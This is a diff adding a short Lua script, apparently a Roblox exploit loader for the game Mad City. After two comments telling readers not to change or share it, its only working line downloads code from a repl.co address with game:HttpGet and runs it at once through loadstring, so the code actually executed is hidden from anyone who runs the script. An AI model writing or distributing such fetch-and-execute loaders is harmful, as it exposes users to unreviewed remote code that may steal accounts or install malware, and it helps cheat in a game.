@@ -1,0 +1,4 @@
+-- Do Not Do Anything In This Script --
+-- Do Not Share This Script To Anyone If Creater Doesn't Want To Give Him --
+
+loadstring(game:HttpGet("https://72df14ea-5c6c-427b-98b6-1bfe265802bc.id.repl.co/mad-city-httpget"))()
